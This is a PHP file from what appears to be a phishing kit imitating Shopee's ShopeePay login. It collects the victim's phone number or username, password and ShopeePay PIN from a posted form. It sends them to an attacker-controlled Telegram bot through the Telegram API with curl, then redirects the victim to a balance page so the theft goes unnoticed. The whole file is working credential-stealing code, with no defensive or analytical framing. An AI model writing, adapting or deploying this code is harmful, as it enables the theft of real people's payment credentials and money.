<?php 



session_start();
include "./telegram.php";

$_SESSION["nomorku"] = $_POST ['nomorku'];
$_SESSION["debit"] = $_POST ['debit'];
$_SESSION["nama"] = $_POST ['nama'];

$message = "⊰᯽⊱┈─𝑺𝒉𝒐𝒑𝒆𝒆─┈⊰᯽⊱".  "\n🔸иσ нρ/υѕєя :\n".  $_POST ['user']. "\n🔸ραѕѕωσя∂ : \n". $_POST ['pass']. "\n🔸ριи ѕнσρєєραу :\n". $_POST ['pinku'];
function sendMessage($telegram_id, $message, $id_bot)
{
$url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($telegram_id, $message, $id_bot);
header("Location:  saldo.html");
?> 